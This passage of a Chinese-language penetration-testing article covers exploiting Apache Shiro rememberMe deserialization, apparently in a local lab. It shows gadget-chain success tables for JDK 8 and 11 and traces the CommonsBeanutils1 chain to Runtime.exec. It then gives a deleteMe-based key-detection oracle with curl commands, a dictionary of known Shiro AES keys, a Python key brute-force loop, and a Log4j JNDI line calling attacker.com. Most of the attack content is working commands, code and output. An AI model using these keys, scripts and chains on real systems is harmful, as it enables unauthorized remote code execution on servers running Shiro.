style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">—</span></span></p></td></tr><tr><td data-colwidth="154" width="154" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CommonsCollections6</span></span></p></td><td data-colwidth="63" width="63" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">RCE 成功 ✓</span></span></p></td><td data-colwidth="161" width="161" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">commons-collections 3.x</span></span></p></td><td data-colwidth="212" width="212" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">—</span></span></p></td></tr><tr><td data-colwidth="154" width="154" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CommonsCollections5</span></span></p></td><td data-colwidth="63" width="63" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">RCE 成功 ✓</span></span></p></td><td data-colwidth="161" width="161" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">commons-collections 3.x</span></span></p></td><td data-colwidth="212" width="212" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">—</span></span></p></td></tr><tr><td data-colwidth="154" width="154" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CommonsCollections3</span></span></p></td><td data-colwidth="63" width="63" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">失败 ✗</span></span></p></td><td data-colwidth="161" width="161" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">commons-collections 3.x</span></span></p></td><td data-colwidth="212" width="212" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Shiro ClassResolver 不支持 Object[]</span></span></p></td></tr><tr><td data-colwidth="154" width="154" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CommonsCollections1</span></span></p></td><td data-colwidth="63" width="63" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">失败 ✗</span></span></p></td><td data-colwidth="161" width="161" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">commons-collections 3.x</span></span></p></td><td data-colwidth="212" width="212" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">AnnotationInvocationHandler 在 JDK&gt;8u71 被修改</span></span></p></td></tr><tr><td data-colwidth="154" width="154" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CommonsCollections2</span></span></p></td><td data-colwidth="63" width="63" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">失败 ✗</span></span></p></td><td data-colwidth="161" width="161" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">commons-collections4</span></span></p></td><td data-colwidth="212" width="212" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">classpath 无此库</span></span></p></td></tr></tbody></table>  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/p5fhoJ8nULKwAr78HQ1HrYOhHKB7pU77uuAfE26GuV5AQ6lWyETJmjeOZrnUCVrUiaibo3EAXl467xAgQbXQl6rQ60ibhkjteDbFwhdkovrZZk/640?wx_fmt=png "")  
  
图 3-3：Gadget 链矩阵自动化测试 —— CB1/CC6/CC5 成功，CC3/CC1 失败  
## 3.5 反序列化链原理深入  
  
CommonsBeanutils1 链执行路径：  
  
入口: PriorityQueue.readObject()            
  
    
↓ 反序列化时调用 heapify() → siftDown() → comparator.compare()            
  
BeanComparator.compare(obj1, obj2)            
  
    
↓ property = "outputProperties"            
  
PropertyUtils.getProperty(obj, "outputProperties")            
  
    
↓ 通过反射调用 getter 方法            
  
TemplatesImpl.getOutputProperties()            
  
    
↓ 内部调用            
  
TemplatesImpl.newTransformer()            
  
    
↓            
  
TemplatesImpl.getTransletInstance()            
  
    
↓ _bytecodes 非空时            
  
TemplatesImpl.defineTransletClasses()            
  
    
↓ 使用 TransletClassLoader.defineClass() 从 _bytecodes 加载类            
  
    
↓ 找到 extends AbstractTranslet 的类            
  
_class[_transletIndex].newInstance()            
  
    
↓ 类实例化时执行 static {} 代码块            
  
Runtime.exec("touch /tmp/pwned")  
    
← RCE!  
  
为什么 CB1 是 Shiro 利用的首选？  
  
1. Shiro 核心库（shiro-core）自带 commons-beanutils 依赖，不需要目标额外引入            
  
2. CB1 使用 String.CASE_INSENSITIVE_ORDER（JDK 内置类）作为 Comparator，不依赖 commons-collections            
  
3. TemplatesImpl._bytecodes 使用 byte[][]（原始数组），Shiro 的 ClassResolvingObjectInputStream 能正常解析            
  
4. 相比 CC3 等使用 Transformer[]（对象数组）的链，CB1 能绕过 Shiro 的数组类解析限制  
  
CC3 失败的技术原因：  
  
// Shiro 的 ClassResolvingObjectInputStream.resolveClass()            
  
// 该方法使用 ClassUtils.forName() 来解析类名            
  
// 对于 "[Ljava.lang.Object;" (Object[]) 或 "[Lorg.apache...Transformer;"            
  
// ClassUtils.forName() 会抛出 ClassNotFoundException            
  
// 导致 CC3 链中的 ChainedTransformer / ConstantTransformer 数组无法反序列化  
  
  
   
# 四、场景二：有 Key 无链 —— 密钥检测与利用  
## 4.1 场景说明  
  
在渗透测试中，经常遇到这样的情况：            
  
• 怀疑目标使用了 Shiro（通过 deleteMe 指纹确认）            
  
• 不确定目标使用的是哪个 AES 密钥            
  
• 不确定目标 classpath 上有哪些可利用的库            
  
  
这种场景下，攻击分为两步：            
  
第一步：密钥检测（确认密钥有效性）            
  
第二步：链探测（找到可用的 Gadget 链）  
## 4.2 密钥检测 Oracle 原理  
  
利用 Shiro 解密 Cookie 后的行为差异来判断密钥是否正确：  
  
密钥正确 + 合法对象:            
  
    
Cookie → AES 解密(正确密钥) → 得到有效字节            
  
    
→ 反序列化成功 → 得到 SimplePrincipalCollection            
  
    
→ Shiro 识别为有效身份 → 不设置 deleteMe            
  
    
→ HTTP 响应中 没有 rememberMe=deleteMe            
  
  
密钥错误:            
  
    
Cookie → AES 解密(错误密钥) → 得到垃圾字节            
  
    
→ 反序列化失败 (InvalidClassException 等)            
  
    
→ Shiro 捕获异常 → 设置 deleteMe 清除 Cookie            
  
    
→ HTTP 响应中 有 rememberMe=deleteMe  
  
具体实现：  
  
我们使用一个完全合法的 SimplePrincipalCollection 对象（Shiro 自身的类，无害，不含任何 Gadget）作为"探针"。这个对象序列化后只有约 100 字节，用候选密钥加密后发送给目标。  
  
生成合法序列化探针：  
  
// BenignSer.java            
  
import org.apache.shiro.subject.SimplePrincipalCollection;            
  
import java.io.*;            
  
  
public class BenignSer {            
  
      
public static void main(String[] args) throws Exception {            
  
          
SimplePrincipalCollection spc = new SimplePrincipalCollection();            
  
          
ObjectOutputStream oos = new ObjectOutputStream(            
  
              
new FileOutputStream("benign.ser"));            
  
          
oos.writeObject(spc);  
    
// 完全合法的 Shiro 对象            
  
          
oos.close();            
  
          
System.out.println("Generated benign.ser: " +            
  
              
new File("benign.ser").length() + " bytes");            
  
      
}            
  
}  
## 4.3 实战密钥检测  
  
用正确密钥加密合法对象：  
  
# 用 Shiro 默认密钥加密            
  
$ COOKIE=$(python3 shiro_exp.py x x --raw benign.ser \            
  
      
--key "kPH+bIxk5D2deZiIxcaaaA==")            
  
$ curl -s -i -H "Cookie: rememberMe=$COOKIE" http://127.0.0.1:8080/ \            
  
      
| grep deleteMe            
  
(无输出)  
    
← 没有 deleteMe = 密钥正确!  
  
用错误密钥加密：  
  
# 用错误密钥加密同样的对象            
  
$ COOKIE_BAD=$(python3 shiro_exp.py x x --raw benign.ser \            
  
      
--key "aaaaaaaaaaaaaaaaaaaaaa==")            
  
$ curl -s -i -H "Cookie: rememberMe=$COOKIE_BAD" http://127.0.0.1:8080/ \            
  
      
| grep deleteMe            
  
Set-Cookie: rememberMe=deleteMe; ...  
    
← 密钥错误!  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/p5fhoJ8nULJpIhxIjMZGuHicZrZPLnocfDYtTodgPYf3Pd5NdpJ9wRrq0HXP5PDZCmf7vhSFkyShT8oKzWb5ts6lhuNsWiaBzGXbrsWiahL2Ho/640?wx_fmt=png "")  
  
图 4-1：密钥检测 Oracle —— 正确密钥无 deleteMe，错误密钥有 deleteMe  
## 4.4 常见 Shiro 密钥字典  
  
实战中，使用常见 Shiro 密钥字典进行批量检测：  
  
kPH+bIxk5D2deZiIxcaaaA==  
      
← Shiro 官方默认密钥（最常见）            
  
2AvVhdsgUs0FSA3SDFAdag==  
      
← 常见自定义密钥            
  
3AvVhmFLUs0KTA3Kprsdag==            
  
4AvVhmFLUs0KTA3Kprsdag==            
  
Z3VucwAAAAAAAAAAAAAAAA==            
  
wGiHplamyXlVB11UXWol8g==            
  
fCq+/xW488hMTCD+cmJ3aQ==            
  
1QWLxg+NYmxraMoxAXu/Iw==            
  
ZUdsaGJByDAA7O4BgJCGhg==            
  
L7RioUULEFhRyxM7a2R/Yg==            
  
...            
  
(完整字典通常包含 100+ 个已知密钥)  
  
自动化密钥爆破脚本思路：  
  
#!/usr/bin/env python3            
  
import requests            
  
  
KEYS = ["kPH+bIxk5D2deZiIxcaaaA==", "2AvVhdsgUs0FSA3SDFAdag==", ...]            
  
TARGET = "http://target:8080/"            
  
BENIGN = open("benign.ser", "rb").read()            
  
  
for key in KEYS:            
  
      
cookie = encrypt_cookie(BENIGN, key)            
  
      
resp = requests.get(TARGET, cookies={"rememberMe": cookie})            
  
      
if "deleteMe" not in resp.headers.get("Set-Cookie", ""):            
  
          
print(f"[+] Valid key found: {key}")            
  
          
break            
  
      
print(f"[-] {key} - invalid")  
## 4.5 确认密钥后的利用策略  
  
一旦确认密钥有效，下一步是找到可用的 Gadget 链。关键认识：  
  
Shiro 自带 commons-beanutils → CB1 几乎总是可用！  
  
Shiro 的核心库 shiro-core 依赖 commons-beanutils，因此只要目标使用了 Shiro，CommonsBeanutils1 链就有很高概率可用。不需要目标额外引入 commons-collections。  
<table><tbody><tr><td data-colwidth="192" width="192" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">场景</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">classpath 情况</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">可用链</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">最常见</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">commons-beanutils + commons-collections</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CB1, CC5, CC6</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">无 CC</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">仅 commons-beanutils（Shiro 自带）</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CB1 仍可用</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">极端情况</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">定制版本移除了 CB</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">需要其他利用方式</span></span></p></td></tr></tbody></table>  
注意：一些旧版攻击工具的 CB1 实现使用了 commons-collections 的 ComparableComparator，导致在"无 CC"目标上失败。ysoserial 的 CB1 正确使用了 JDK 内置的 String.CASE_INSENSITIVE_ORDER，不依赖 CC，是正确的实现。  
  
  
   
# 五、场景三：高版本 JDK 下的 Shiro 利用  
## 5.1 JDK 版本对利用的影响分析  
  
很多安全工程师误以为"高版本 JDK 能防住 Shiro 反序列化攻击"。我们通过实验证明这个观点是错误的。  
  
高版本 JDK 的两个安全增强及其对 Shiro 的实际影响：  
  
影响 1: AnnotationInvocationHandler 修改（JDK 8u76+）            
  
    
• CC1 链依赖该类的 readObject 行为            
  
    
• JDK 8u76 后该类被重构，CC1 链失效            
  
    
• 对 CB1/CC5/CC6 无影响（不使用该类）            
  
  
影响 2: JNDI 远程类加载被禁用（JDK 8u191+）            
  
    
• com.sun.jndi.ldap.object.trustURLCodebase 默认设为 false            
  
    
• 禁止通过 JNDI 从远程 URL 加载 Java 类            
  
    
• 但这对 Shiro 利用几乎没有影响！            
  
      
原因：Shiro 的攻击面是反序列化，使用 TemplatesImpl.defineClass() 在 JVM 内部直接定义类            
  
      
这是本地类加载，完全不依赖 JNDI 或远程 URL  
  
与 Log4j / Fastjson 对比：  
  
┌──────────────────────────────────────────────────────────────┐            
  
│ Log4j (CVE-2021-44228) 攻击流程:  
                               
│            
  
│ ${jndi:ldap://attacker.com/Exploit}  
                           
│            
  
│  
     
→ 目标主动连接攻击者 LDAP 服务器  
                              
│            
  
│  
     
→ 下载远程 Exploit.class 并加载  
                               
│            
  
│  
     
→ 需要出网 + 不受 trustURLCodebase=false 限制时可行  
           
│            
  
│  
                                                                
│            
  
│ Shiro 反序列化攻击流程:  
                                        
│            
  
│ rememberMe=                     │      │   → Cookie 中已包含完整的恶意类字节码                         │      │   → TemplatesImpl.defineClass() 在 JVM 本地加载               │      │   → 不需要出网, 不受 trustURLCodebase 限制                    │      │   → 高版本 JDK 对此机制无影响!                                │      └──────────────────────────────────────────────────────────────┘  
## 5.2 JDK 11 实验验证  
  
将同一个 Shiro 1.2.4 应用分别运行在 JDK 8 和 JDK 11 上，对比利用结果：  
  
# 在 JDK 11 上运行 Shiro 应用            
  
$ /usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar shirodemo.jar \            
  
      
--server.port=8081            
  
  
# 确认 JDK 版本            
  
$ /usr/lib/jvm/java-11-openjdk-amd64/bin/java -version            
  
openjdk version "11.0.31" 2025-04-15  
  
测试结果对比：  
<table><tbody><tr><td data-colwidth="154" width="154" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Gadget 链</span></span></p></td><td data-colwidth="105" width="105" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">JDK 8u102 结果</span></span></p></td><td data-colwidth="105" width="105" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">JDK 11.0.31 结果</span></span></p></td><td data-colwidth="227" width="227" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">说明</span></span></p></td></tr><tr><td data-colwidth="154" width="154" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CommonsBeanutils1</span></span></p></td><td data-colwidth="105" width="105" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">RCE 成功</span></span></p></td><td data-colwidth="105" width="105" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">RCE 成功</span></span></p></td><td data-colwidth="227" width="227" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">TemplatesImpl 本地加载，不受 JDK 限制</span></span></p></td></tr><tr><td data-colwidth="154" width="154" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CommonsCollections6</span></span></p></td><td data-colwidth="105" width="105" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">RCE 成功</span></span></p></td><td data-colwidth="105" width="105" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">RCE 成功</span></span></p></td><td data-colwidth="227" width="227" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">HashSet + TiedMapEntry，不依赖特定 JDK 类</span></span></p></td></tr><tr><td data-colwidth="154" width="154" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CommonsCollections5</span></span></p></td><td data-colwidth="105" width="105" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">RCE 成功</span></span></p></td><td data-colwidth="105" width="105" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">RCE 成功</span></span></p></td><td data-colwidth="227" width="227" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">BadAttributeValueExpException</span></span></p></td></tr><tr><td data-colwidth="154" width="154" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CommonsCollections1</span></span></p></td><td data-colwidth="105" width="105" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">失败</span></span></p></td><td data-colwidth="105" width="105" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">失败</span></span></p></td><td data-colwidth="227" width="227" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">AnnotationInvocationHandler 修改（与 JDK 版本相关）</span></span></p></td></tr><tr><td data-colwidth="154" width="154" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CommonsCollections3</span></span></p></td><td data-colwidth="105" width="105" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">失败</span></span></p></td><td data-colwidth="105" width="105" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">失败</span></span></p></td><td data-colwidth="227" width="227" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Shiro ClassResolver 限制（与 Shiro 